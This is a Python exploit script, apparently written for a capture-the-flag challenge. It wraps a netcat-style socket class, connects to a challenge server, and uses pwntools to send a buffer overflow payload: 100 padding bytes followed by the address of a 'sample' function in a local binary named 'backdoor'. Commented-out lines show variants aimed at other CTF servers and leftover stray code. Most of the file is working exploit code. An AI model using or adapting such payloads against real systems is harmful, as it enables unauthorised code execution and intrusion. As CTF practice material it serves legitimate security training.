import socket
import re
import math
import time
# https://gist.github.com/leonjza/f35a7252babdf77c8421 
class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):

        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):

        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)
 
    def read_until(self, data):

        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):

        self.socket.send(data)
    
    def close(self):

        self.socket.close()

  
# A function to print all prime factors of  
# a given number n 

if __name__ == '__main__':
    '''
    n = 99977501182681
    a, b  = primeFactors(n)
    print(int(a) , int(b))
    '''
    #nc = Netcat('challenges.tamuctf.com', 8573)
    nc = Netcat('hack.bckdr.in',12001 )
    j = 1
    
    
    from pwn import *

    vuln = ELF('./backdoor')
    padding = b'A' * 100
    payload = p32(vuln.symbols['sample'])

    #exploit = padding + payload + asm('nop') * 4 + p32(0xDEADBEEF) + p32(0xDEADC0DE)
    exploit = padding + payload
    #s = ssh(host='2018shell1.picoctf.com', user='Platy')

    #py = s.run('cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4; ./vuln')
    
    while j:
        nc.buff = b''
        '''
        string = nc.read_until(b"\n")
        string = string.decode("utf-8")
        #string = re.findall(r"\'(.*)\'", string)
        #string = ' '.join(string)
        print(string)
        
        nc.write(b'adfasdfsadf\n')
        string = nc.read_until(b"\n")
        string = string.decode("utf-8")
        print(string[:-1])
        '''
        #s = nc 
        #print(py.recv())
        #py.sendline(exploit)
        #print(py.recv())
        #s.close()
        #s = 'A'*62 + 'k\x85\x04\x08'+"\n"
        
        #s = str.encode(s)
        #time.sleep(3)
        print(exploit)
        nc.write(exploit)
        nc.write(b'\n')
        i = 2
        while i:
            string = nc.read()
            #string = string.decode("utf-8")
            print(string)
            i -= 1
        #string += "\n"
        #string = str.encode(string)
        #nc.write(string)
        j -= 1
        
        
        
        
        
        
